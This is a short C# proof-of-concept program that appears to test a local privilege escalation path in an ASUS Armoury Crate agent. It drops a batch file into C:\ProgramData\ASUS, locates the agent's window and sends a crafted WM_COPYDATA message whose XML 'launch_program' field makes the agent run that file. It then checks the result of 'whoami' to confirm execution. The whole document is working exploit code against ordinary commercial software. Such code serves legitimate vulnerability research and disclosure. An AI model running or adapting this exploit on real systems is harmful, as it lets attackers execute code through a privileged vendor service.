// Test dwData=163 (LaunchProgram) with LOCAL path (contains ":\")
// Explorer.exe branch — will run at MEDIUM IL but confirms ParseLaunchXml works
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Test163Local {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr FindWindow(string c, string n);
    [DllImport("user32.dll")]
    static extern IntPtr SendMessage(IntPtr h, uint m, IntPtr w, ref CDS l);
    [StructLayout(LayoutKind.Sequential)]
    struct CDS { public UIntPtr d; public uint cb; public IntPtr lp; }

    static void Main() {
        string bat = @"C:\ProgramData\ASUS\lpe_proof.bat";
        string out_ = @"C:\Users\Public\lpe_local_test.txt";
        if (File.Exists(out_)) File.Delete(out_);
        File.WriteAllText(bat,
            "@echo off\r\nwhoami /groups > \"" + out_ + "\"\r\nwhoami >> \"" + out_ + "\"\r\n");
        Console.WriteLine("[+] Bat written");

        IntPtr hwnd = FindWindow("ArmourySwAgentClass", "ArmourySwAgentName");
        Console.WriteLine("[+] hwnd=0x" + hwnd.ToString("X"));

        string xml = "<root><launch_program><link>" + bat + "</link></launch_program></root>";
        byte[] data = Encoding.Unicode.GetBytes(xml);
        IntPtr p = Marshal.AllocHGlobal(data.Length + 16);
        for (int i = 0; i < data.Length + 16; i++) Marshal.WriteByte(p, i, 0);
        Marshal.Copy(data, 0, p, data.Length);
        CDS cds = new CDS { d = (UIntPtr)163, cb = (uint)(data.Length + 2), lp = p };
        IntPtr r = SendMessage(hwnd, 0x4A, IntPtr.Zero, ref cds);
        Console.WriteLine("[+] SendMessage result=" + r + " xmlBytes=" + data.Length + " cbData=" + cds.cb);
        Marshal.FreeHGlobal(p);

        Console.WriteLine("[*] Waiting 6s...");
        Thread.Sleep(6000);
        if (File.Exists(out_)) {
            Console.WriteLine("[+] Bat EXECUTED:");
            Console.WriteLine(File.ReadAllText(out_));
        } else {
            Console.WriteLine("[-] Bat NOT executed (lpe_local_test.txt not created)");
        }
    }
}
